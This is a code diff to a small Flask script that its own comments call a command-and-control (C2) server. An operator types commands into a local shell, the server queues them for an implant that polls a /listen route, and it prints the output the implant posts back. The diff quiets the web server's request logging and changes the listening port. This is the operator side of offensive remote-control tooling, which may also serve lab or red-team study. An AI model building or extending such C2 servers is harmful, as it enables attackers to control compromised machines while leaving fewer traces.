@@ -3,6 +3,7 @@ from flask import Flask, request, jsonify
 from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
 import threading
+import logging
 
 app = Flask(__name__)
 app.config['COMPRESS_REGISTER'] = False
@@ -16,6 +17,9 @@ def shell():
         if cmd:
             cmd_queue.put(cmd)
 
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 # define a route to listener for C2 server
 @app.route('/listen', methods=['POST', 'GET'])
 def listen():
@@ -24,7 +28,7 @@ def listen():
         data = request.get_json()
         print(data.get("output"))
         return jsonify({"status": "success"}), 200
-    
+
 # outbound command to C2 server    
     elif request.method == 'GET':
         try:
@@ -35,5 +39,5 @@ def listen():
         
 if __name__ == '__main__':
     threading.Thread(target=shell, daemon=True).start()
-    app.run(host='0.0.0.0', port=80)
+    app.run(host='0.0.0.0', port=8080)
     
